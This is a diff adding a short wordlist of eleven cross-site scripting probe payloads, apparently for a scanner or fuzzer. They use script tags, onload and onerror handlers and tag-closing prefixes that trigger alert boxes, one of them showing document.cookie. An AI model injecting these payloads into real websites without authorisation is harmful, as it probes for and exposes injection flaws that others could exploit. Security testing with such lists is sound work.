@@ -1,0 +1,11 @@
+;<script>alert("xxs");</script>
+'"--></style></scRipt><scRipt>alert(document.cookie)</scRipt>
+;<body onload=alert("XSS")>
+'><script>alert(1)</script>
+</title><body onload=alert("XSS")>
+</title><script>alert(1)</script>
+<sCriPt>alert(1);</sCriPt>
+>'>"><img src=x onerror=alert("xxs")>
+</style></scRipt><scRipt>alert('ILOVEXXS')</scRipt>
+\"><script>alert("xxs")</script>
+"></title></style></scrIpt><scRipt>alert('XXS')</scrIpt>
